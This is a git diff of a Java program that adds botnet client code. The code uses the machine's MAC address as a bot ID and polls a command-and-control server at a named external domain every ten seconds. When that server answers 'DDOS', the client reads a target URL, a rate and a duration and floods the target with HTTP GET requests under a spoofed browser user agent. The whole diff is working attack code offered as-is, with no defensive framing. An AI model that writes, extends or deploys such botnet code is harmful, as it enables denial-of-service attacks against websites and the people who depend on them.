@@ -5,71 +5,144 @@ import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
-import java.net.SocketException;
 import java.net.URL;
-import java.net.UnknownHostException;
 
 public class Main {
 
+	// properties
 	private static final String USER_AGENT = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36";
+	private static final String CC_URL = "http://www.yolocaust.de/tentob/connect.php?id=";
 
-	private void sendGet() throws Exception {
+	// commands
+	// private static final String IDLE_COMMAND = "IDLE";
+	private static final String DDOS_COMMAND = "DDOS";
 
-		// build up connection
-		String url = "http://www.yolocaust.de/tentob/connect.php?id=15&ip=192.168.13.114";
-		URL obj = new URL(url);
-		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
-		con.setRequestMethod("GET");
-		con.setRequestProperty("User-Agent", USER_AGENT);
+	// values setted on startup
+	private static String BOT_ID;
+	private static boolean DEBUG = true;
 
-		// evaluate the response
-		int responseCode = con.getResponseCode();
+	// dynamic values
+	private static String COMMAND = "IDLE";
+	private static String TARGET_URL = "http://www.yolocaust.de/tentob/";
+	private static int DDOS_FREQUENCY = 3; // attempts per second
+	private static int DDOS_DURATION; // in seconds
 
-		BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
+	private static void requestCC() throws Exception {
+
+		// set up connection
+		String ccUrl = CC_URL + BOT_ID;
+		URL ccUrlObj = new URL(ccUrl);
+		HttpURLConnection hhHttpURLConnection = (HttpURLConnection) ccUrlObj.openConnection();
+		hhHttpURLConnection.setRequestMethod("GET");
+		hhHttpURLConnection.setRequestProperty("User-Agent", USER_AGENT);
+
+		// get response
+		BufferedReader in = new BufferedReader(new InputStreamReader(hhHttpURLConnection.getInputStream()));
 		String inputLine;
 		StringBuffer response = new StringBuffer();
-		while ((inputLine = in.readLine()) != null) 
+		while ((inputLine = in.readLine()) != null)
 			response.append(inputLine);
 		in.close();
 
 		// show response
-		System.out.println("Sending 'GET' request to URL : " + url);
-		System.out.println("Response Code : " + responseCode);
-		System.out.println("Response : "+response.toString());
+		if (DEBUG) {
+			System.out.println("Requested CC: " + ccUrl);
+			System.out.println("Response: " + response.toString());
+		}
 
+		// evaluate response
+		if (response != null && !response.toString().isEmpty()) {
+			String possibleCommand = response.toString().split(" ")[0];
+			switch (possibleCommand) {
+			case DDOS_COMMAND:
+				// expecting 3 more args besides command
+				String[] splittedResponse = response.toString().split(" ");
+				if (splittedResponse.length == 4) {
+					COMMAND = DDOS_COMMAND;
+					TARGET_URL = splittedResponse[1];
+					DDOS_FREQUENCY = Integer.parseInt(splittedResponse[2]);
+					DDOS_DURATION = Integer.parseInt(splittedResponse[3]);
+				} else
+					System.err.println("x args given, y args expecting => doing nothing");
+				break;
+
+			default:
+				// nothing
+				break;
+			}
+		}
+
+	}
+
+	private static void performDDoS() throws Exception {
+
+		if(TARGET_URL != null && !TARGET_URL.isEmpty()) {
+			for (int i = 0; i < DDOS_FREQUENCY; i++) {
+				URL ccUrlObj = new URL(TARGET_URL);
+				HttpURLConnection hhHttpURLConnection = (HttpURLConnection) ccUrlObj.openConnection();
+				hhHttpURLConnection.setRequestMethod("GET");
+				hhHttpURLConnection.setRequestProperty("User-Agent", USER_AGENT);
+	
+				BufferedReader in = new BufferedReader(new InputStreamReader(hhHttpURLConnection.getInputStream()));
+				/*
+				 * String inputLine; StringBuffer response = new StringBuffer();
+				 * while ((inputLine = in.readLine()) != null)
+				 * response.append(inputLine);
+				 */
+				in.close();
+			}
+		} else
+			System.err.println("No Target-URL specified => no attack performed");
+
+		return;
 	}
 
 	public static void main(String[] args) throws Exception {
 
-		InetAddress ip;
 		try {
 
-			ip = InetAddress.getLocalHost();
-
-			NetworkInterface network = NetworkInterface.getByInetAddress(ip);
-
-			byte[] mac = network.getHardwareAddress();
-
-			System.out.print("MAC address : ");
-
-			StringBuilder sb = new StringBuilder();
+			InetAddress inetAddress = InetAddress.getLocalHost();
+			NetworkInterface networkInterface = NetworkInterface.getByInetAddress(inetAddress);
+			byte[] mac = networkInterface.getHardwareAddress();
+			StringBuilder stringBuilder = new StringBuilder();
 			for (int i = 0; i < mac.length; i++) {
-				sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
+				stringBuilder.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
 			}
-			System.out.println(sb.toString());
+			BOT_ID = stringBuilder.toString();
 
-		} catch (UnknownHostException e) {
+			if (DEBUG)
+				System.out.println("Bot-ID (MAC address): " + BOT_ID);
 
+			// "listen" for a command
+			Thread thread = new Thread() {
+				public void run() {
+					while (true) {
+						try {
+							Main.requestCC();
+
+							switch (COMMAND) {
+
+							case "DDOS":
+								performDDoS();
+								break;
+
+							default:
+								// just idle around
+								break;
+							}
+
+							Thread.sleep(10000); // sleep 10 seconds
+						} catch (Exception e) {
+							e.printStackTrace();
+						}
+					}
+				}
+			};
+			thread.start();
+
+		} catch (Exception e) {
 			e.printStackTrace();
-
-		} catch (SocketException e) {
-
-			e.printStackTrace();
-
 		}
-
-		Main main = new Main();
-		main.sendGet();
 
 	}
 
